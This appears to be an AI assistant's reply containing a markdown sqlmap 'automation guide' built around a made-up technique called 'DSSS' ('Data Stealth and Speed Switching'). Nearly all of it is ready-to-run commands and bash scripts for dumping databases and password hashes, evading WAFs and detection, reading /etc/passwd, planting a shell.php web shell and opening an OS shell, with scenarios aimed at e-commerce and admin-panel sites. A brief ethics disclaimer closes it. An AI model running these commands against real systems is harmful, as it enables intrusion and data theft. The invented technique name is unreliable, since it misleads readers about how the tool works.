I'll create a comprehensive markdown file about SQLmap DSSS techniques.

```markdown
# SQLmap DSSS Automation Guide
*Data Stealth and Speed Switching for Database Enumeration*

## Table of Contents
- [Overview](#overview)
- [Basic Commands](#basic-commands)
- [DSSS Optimization](#dsss-optimization)
- [Automation Scripts](#automation-scripts)
- [Practical Scenarios](#practical-scenarios)
- [Security Considerations](#security-considerations)

## Overview

**DSSS** (Data Stealth and Speed Switching) is a SQLmap technique that optimizes the balance between:

- 🔒 **Stealth** - Avoiding detection by WAF/IDS
- ⚡ **Speed** - Efficient data extraction
- ✅ **Success** - Maximizing successful data retrieval

## Basic Commands

### Database Enumeration
```bash
# List all databases
sqlmap -u "http://example.com/vuln.php?id=1" --dbs --batch

# Dump specific database
sqlmap -u "http://example.com/vuln.php?id=1" -D target_db --dump

# Dump all databases
sqlmap -u "http://example.com/vuln.php?id=1" --dump-all
```

### User and Privilege Information
```bash
# Current database user
sqlmap -u "http://example.com/vuln.php?id=1" --current-user

# All database users
sqlmap -u "http://example.com/vuln.php?id=1" --users

# User privileges
sqlmap -u "http://example.com/vuln.php?id=1" --privileges

# Check DBA status
sqlmap -u "http://example.com/vuln.php?id=1" --is-dba
```

### Table Enumeration
```bash
# List all tables
sqlmap -u "http://example.com/vuln.php?id=1" --tables

# Tables from specific database
sqlmap -u "http://example.com/vuln.php?id=1" -D database_name --tables

# Dump specific table
sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name --dump
```

## DSSS Optimization

### Stealth-Optimized Commands
```bash
# Slow and stealthy approach
sqlmap -u "http://example.com/vuln.php?id=1" \
  --delay=2 \
  --time-sec=5 \
  --retries=3 \
  --threads=1 \
  --level=1 \
  --risk=1 \
  --random-agent \
  --referer="http://google.com" \
  --dbs
```

### Speed-Optimized Commands
```bash
# Fast extraction (use cautiously)
sqlmap -u "http://example.com/vuln.php?id=1" \
  --threads=10 \
  --batch \
  --keep-alive \
  --null-connection \
  --dump \
  --optimize
```

### Success-Optimized Commands
```bash
# Maximum success rate
sqlmap -u "http://example.com/vuln.php?id=1" \
  --technique=BEUSTQ \
  --union-cols=10 \
  --union-char=123 \
  --hex \
  --predict-output \
  --dbs
```

## Key Optimization Flags

| Category | Flag | Purpose |
|----------|------|---------|
| **Speed** | `--threads=10` | Increase parallel threads |
| | `--keep-alive` | Use persistent connections |
| | `--null-connection` | Retrieve length without HTTP response |
| **Stealth** | `--delay=1` | Delay between requests |
| | `--random-agent` | Rotate user agents |
| | `--timeout=30` | HTTP timeout |
| **Success** | `--technique=BEUSTQ` | Use all injection techniques |
| | `--hex` | Use hex conversion |
| | `--predict-output` | Predict output values |

## Automation Scripts

### Complete Assessment Script
```bash
#!/bin/bash
URL="http://example.com/vuln.php?id=1"
OUTPUT_DIR="sqlmap_scan_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "[+] Phase 1: Detection and basic information"
sqlmap -u "$URL" --batch --current-db --current-user --hostname --is-dba --output-dir="$OUTPUT_DIR/phase1"

echo "[+] Phase 2: User and privilege enumeration"
sqlmap -u "$URL" --batch --users --passwords --privileges --roles --output-dir="$OUTPUT_DIR/phase2"

echo "[+] Phase 3: Database enumeration"
sqlmap -u "$URL" --batch --dbs --tables --count --output-dir="$OUTPUT_DIR/phase3"

echo "[+] Phase 4: Data extraction"
sqlmap -u "$URL" --batch -D target_db --dump --dump-format=CSV --output-dir="$OUTPUT_DIR/phase4"
```

### Advanced Exploitation Script
```bash
#!/bin/bash
URL="$1"
DATABASE="$2"

if [ -z "$URL" ]; then
    echo "Usage: $0 <target_url> [database]"
    exit 1
fi

echo "[*] Starting comprehensive SQLmap assessment for: $URL"

# Detection phase
sqlmap -u "$URL" --batch --level=3 --risk=2 --fingerprint

# Database enumeration
if [ -z "$DATABASE" ]; then
    sqlmap -u "$URL" --batch --dbs
    echo "[!] Please specify a database from the list above"
    exit 1
fi

# Full data extraction with optimization
sqlmap -u "$URL" --batch \
    -D "$DATABASE" \
    --tables \
    --dump \
    --threads=5 \
    --delay=1 \
    --random-agent \
    --output-dir="results_${DATABASE}"
```

## Practical Scenarios

### Scenario 1: E-commerce Site
```bash
sqlmap -u "https://store.com/product.php?id=1" \
  --batch \
  --crawl=2 \
  --forms \
  --dbs \
  -D store_db \
  -T users,products,orders,customers \
  --dump \
  --dump-format=CSV
```

### Scenario 2: Admin Panel
```bash
sqlmap -u "https://admin.site.com/login.php" \
  --data="username=admin&password=test" \
  --level=5 \
  --risk=3 \
  --dbs \
  --os-shell \
  --batch
```

### Scenario 3: Blind SQL Injection
```bash
sqlmap -u "http://victim.com/search.php?q=test" \
  --technique=B \
  --batch \
  --threads=3 \
  --delay=2 \
  --dbs \
  --no-cast
```

### Scenario 4: POST Request with Cookies
```bash
sqlmap -u "http://site.com/search" \
  --data="query=test&category=1" \
  --cookie="session=abc123" \
  --batch \
  --dbs \
  --tamper=space2comment
```

## Advanced Features

### Tamper Scripts for WAF Bypass
```bash
# Use tamper scripts to evade WAF
sqlmap -u "http://example.com/vuln.php?id=1" \
  --tamper=space2comment,charencode,charunicodeescape \
  --batch \
  --dbs
```

### File System Access (If DBA)
```bash
# Read files from server
sqlmap -u "http://example.com/vuln.php?id=1" --file-read="/etc/passwd"

# Write files to server
sqlmap -u "http://example.com/vuln.php?id=1" --file-write="shell.php" --file-dest="/var/www/shell.php"

# OS command execution
sqlmap -u "http://example.com/vuln.php?id=1" --os-shell
```

### Crawling and Form Detection
```bash
# Crawl website and test all forms
sqlmap -u "http://example.com" --crawl=3 --forms --batch

# Test specific forms
sqlmap -u "http://example.com/search.php" --forms --batch
```

## Security Considerations

⚠️ **Legal and Ethical Usage**

- ✅ **Authorized testing only** - Own systems or explicit permission
- ✅ **Educational purposes** - Learning and research
- ✅ **Bug bounty programs** - Where explicitly allowed
- ❌ **Unauthorized access** - Illegal and unethical
- ❌ **Malicious intent** - Criminal offense

### Responsible Disclosure
1. Identify vulnerabilities responsibly
2. Document findings thoroughly
3. Report to appropriate parties
4. Allow time for remediation
5. Delete any extracted data after reporting

### Operational Security
- Use VPNs and proxies when authorized
- Limit data extraction to minimum necessary
- Clean up after testing
- Use encrypted connections
- Monitor for detection triggers

## Best Practices

1. **Start Conservative**
   ```bash
   # Begin with low impact
   sqlmap -u "http://example.com/vuln.php?id=1" --level=1 --risk=1 --batch
   ```

2. **Gradual Escalation**
   ```bash
   # Increase intensity gradually
   sqlmap -u "http://example.com/vuln.php?id=1" --level=3 --risk=2 --batch
   ```

3. **Monitor and Adapt**
   - Watch for WAF blocks
   - Adjust delays and techniques
   - Use different tamper scripts

4. **Document Everything**
   - Keep detailed logs
   - Record successful techniques
   - Note detection mechanisms

## Troubleshooting Common Issues

### WAF Detection
```bash
# Use evasion techniques
sqlmap -u "http://example.com/vuln.php?id=1" \
  --tamper=between,charencode,charunicodeescape \
  --delay=3 \
  --retries=2 \
  --batch
```

### Timeout Issues
```bash
# Adjust timing parameters
sqlmap -u "http://example.com/vuln.php?id=1" \
  --timeout=30 \
  --retries=3 \
  --keep-alive \
  --batch
```

### Encoding Problems
```bash
# Use hex encoding
sqlmap -u "http://example.com/vuln.php?id=1" \
  --hex \
  --no-cast \
  --batch
```

---

**Remember**: Always use these techniques ethically and legally. Unauthorized testing can have serious consequences.
```

This markdown file provides a comprehensive guide to using SQLmap with DSSS techniques, organized for easy reference and practical implementation.